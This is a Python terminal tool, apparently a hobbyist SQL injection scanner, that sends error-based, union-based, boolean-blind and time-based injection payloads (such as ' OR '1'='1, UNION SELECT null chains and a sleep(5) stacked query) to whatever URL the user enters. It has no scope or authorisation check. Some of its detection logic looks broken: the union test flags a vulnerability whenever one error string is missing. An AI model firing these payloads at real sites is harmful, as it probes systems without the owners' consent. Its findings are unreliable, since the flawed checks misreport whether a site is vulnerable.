import requests
import re
import time
import curses
from curses import wrapper

# Error patterns to detect SQL injection vulnerabilities
error_patterns = [
    "SQL syntax", "mysql_fetch", "sql error", "unclosed quotation",
    "no such table", "unterminated quoted string"
]

def show_banner(stdscr):
    banner = r"""


          __   _   _            __             
/ _| / \ | |  ()  _ ()/ _|()  _  ||   
\_ \( o )| |_ |||/ \||| ] |||/ \/o|\V7
|__/ \_,7|___|L|L_n|||L|  L|L_n|\_|/n\
                    //                 

    SQLinjFindX by root0emir
    """
    
    stdscr.clear()
    height, width = stdscr.getmaxyx()
    for i, line in enumerate(banner.splitlines()):
        x = width // 2 - len(line) // 2
        y = height // 4 + i
        stdscr.addstr(y, x, line, curses.color_pair(1))
    stdscr.refresh()
    time.sleep(2)  # Adjust to delay the display before the menu shows

class SQLiTool:
    def __init__(self, stdscr):
        self.stdscr = stdscr
        self.stdscr.clear()
        curses.curs_set(0)
        self.menu_options = ["Error-Based SQLi", "Union-Based SQLi", "Blind SQLi", "Time-Based SQLi", "Exit"]
        self.selected = 0
        self.url = self.get_url()  # Get the URL from the user
        self.run_tool()

    def get_url(self):
        self.stdscr.clear()
        self.stdscr.addstr(2, 2, "Please enter the target URL: ", curses.color_pair(1))
        curses.echo()  # Enable echoing of user input
        url = self.stdscr.getstr(3, 2).decode('utf-8')  # Get the user input
        curses.noecho()  # Disable echoing again
        return url

    def print_menu(self):
        self.stdscr.clear()
        height, width = self.stdscr.getmaxyx()
        title = "SQLinjfindX"
        self.stdscr.addstr(1, width//2 - len(title)//2, title, curses.color_pair(1))

        for idx, option in enumerate(self.menu_options):
            x = width // 2 - len(option) // 2
            y = height // 2 - len(self.menu_options) // 2 + idx
            if idx == self.selected:
                self.stdscr.addstr(y, x, option, curses.color_pair(2))
            else:
                self.stdscr.addstr(y, x, option)
        self.stdscr.refresh()

    def run_tool(self):
        curses.init_pair(1, curses.COLOR_CYAN, curses.COLOR_BLACK)
        curses.init_pair(2, curses.COLOR_BLACK, curses.COLOR_CYAN)

        while True:
            self.print_menu()
            key = self.stdscr.getch()
            if key == curses.KEY_UP and self.selected > 0:
                self.selected -= 1
            elif key == curses.KEY_DOWN and self.selected < len(self.menu_options) - 1:
                self.selected += 1
            elif key == curses.KEY_ENTER or key in [10, 13]:
                if self.menu_options[self.selected] == "Exit":
                    break
                else:
                    self.stdscr.clear()
                    self.stdscr.refresh()
                    if self.menu_options[self.selected] == "Error-Based SQLi":
                        self.show_result(self.error_based_sqli())
                    elif self.menu_options[self.selected] == "Union-Based SQLi":
                        self.show_result(self.union_based_sqli())
                    elif self.menu_options[self.selected] == "Blind SQLi":
                        self.show_result(self.blind_sqli())
                    elif self.menu_options[self.selected] == "Time-Based SQLi":
                        self.show_result(self.time_based_sqli())

    def show_result(self, result):
        self.stdscr.clear()
        self.stdscr.addstr(2, 2, "Results:", curses.color_pair(1))
        y = 4
        for line in result:
            self.stdscr.addstr(y, 2, line)
            y += 1
            self.stdscr.refresh()
            time.sleep(0.1)

        self.stdscr.addstr(y + 1, 2, "Press any key to return to the menu.")
        self.stdscr.refresh()
        self.stdscr.getch()  # Wait for user input to return to the menu
        
        # Call the print_menu method to show the menu again
        self.print_menu()  

    def error_based_sqli(self):
        result = ["[Error-Based SQL Injection Test]"]
        payloads = ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "UNION SELECT null--", " AND 1=1"]
        for payload in payloads:
            response = requests.get(self.url + payload)  # Use the input URL
            for error in error_patterns:
                if re.search(error, response.text, re.IGNORECASE):
                    result.append(f"[+] Vulnerability found with payload: {payload}")
                    return result
        result.append("[-] No error-based SQLi vulnerabilities found.")
        return result

    def union_based_sqli(self):
        result = ["[Union-Based SQL Injection Test]"]
        for i in range(1, 10):  
            payload = f"' UNION SELECT {', '.join(['null']*i)}-- "
            response = requests.get(self.url + payload)  # Use the input URL
            if "unknown column" not in response.text.lower():
                result.append(f"[+] Vulnerability detected with {i} columns.")
                return result
        result.append("[-] No union-based SQLi vulnerabilities found.")
        return result

    def blind_sqli(self):
        result = ["[Blind SQL Injection Test]"]
        true_payload = "' AND 1=1-- "
        false_payload = "' AND 1=0-- "
        true_response = requests.get(self.url + true_payload)  # Use the input URL
        false_response = requests.get(self.url + false_payload)  # Use the input URL
        if true_response.text != false_response.text:
            result.append("[+] Blind SQL Injection Vulnerability Detected")
        else:
            result.append("[-] No blind SQLi vulnerabilities found.")
        return result

    def time_based_sqli(self):
        result = ["[Time-Based Blind SQL Injection Test]"]
        payload = "'; SELECT IF(1=1, sleep(5), 0); -- "
        start = time.time()
        response = requests.get(self.url + payload)  # Use the input URL
        elapsed = time.time() - start
        if elapsed > 5:
            result.append("[+] Time-based Blind SQL Injection Vulnerability Detected")
        else:
            result.append("[-] No time-based SQLi vulnerabilities found.")
        return result

def main(stdscr):
    curses.init_pair(1, curses.COLOR_CYAN, curses.COLOR_BLACK)
    show_banner(stdscr) 
    SQLiTool(stdscr) 

if __name__ == "__main__":
    wrapper(main)
